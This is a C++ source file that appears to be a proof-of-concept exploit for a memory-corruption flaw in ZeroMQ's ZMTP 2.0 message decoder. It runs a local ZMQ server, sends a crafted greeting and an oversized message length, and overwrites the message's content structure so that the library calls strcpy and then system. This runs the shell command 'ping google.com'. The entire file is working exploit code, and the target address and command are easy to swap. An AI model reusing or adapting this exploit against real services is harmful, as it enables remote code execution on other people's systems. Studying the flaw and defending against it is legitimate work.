#include <netinet/in.h>
#include <arpa/inet.h>
#include <zmq.hpp>
#include <string>
#include <iostream>
#include <unistd.h>
#include <thread>
#include <mutex>

class Thread {
    public:
    Thread() : the_thread(&Thread::ThreadMain, this)
    { }
    ~Thread(){
    }
    private:
    std::thread the_thread;
    void ThreadMain() {
        zmq::context_t context (1);
        zmq::socket_t socket (context, ZMQ_REP);
        socket.bind ("tcp://*:6666");

        while (true) {
            zmq::message_t request;

            // Wait for next request from client
            try {
                socket.recv (&request);
            } catch ( ... ) { }
        }
    }
};

static void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)
{
    int s;
    struct sockaddr_in remote_addr = {};
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        abort();
    }
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons(6666);
    inet_pton(AF_INET, "127.0.0.1", &remote_addr.sin_addr);

    if (connect(s, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) == -1)
    {
        abort();
    }

    const uint8_t greeting[] = {
        0xFF, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */
        0x01, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
        0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */
        0x00, /* Unused */
    };
    send(s, greeting, sizeof(greeting), 0);

    const uint8_t v2msg[] = {
        0x02, /* v2_decoder_t::eight_byte_size_ready */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */
    };
    send(s, v2msg, sizeof(v2msg), 0);

    /* Write UNTIL the location of zmq::msg_t::content_t */
    size_t plsize = 8183;
    uint8_t* pl = (uint8_t*)calloc(1, plsize);
    send(s, pl, plsize, 0);
    free(pl);

    uint8_t content_t_replacement[] = {
        /* void* data */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        /* size_t size */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        /* msg_free_fn *ffn */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        /* void* hint */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };

    /* Assumes same endianness as target */
    memcpy(content_t_replacement + 0, &arg1Addr, sizeof(arg1Addr));
    memcpy(content_t_replacement + 16, &funcAddr, sizeof(funcAddr));
    memcpy(content_t_replacement + 24, &arg2Addr, sizeof(arg2Addr));

    /* Overwrite zmq::msg_t::content_t */
    send(s, content_t_replacement, sizeof(content_t_replacement), 0);

    close(s);
    sleep(1);
}

char destbuffer[100];
char srcbuffer[100] = "ping google.com";

int main(void)
{
    Thread* rt = new Thread();
    sleep(1);

    callRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);

    callRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);

    return 0;
}
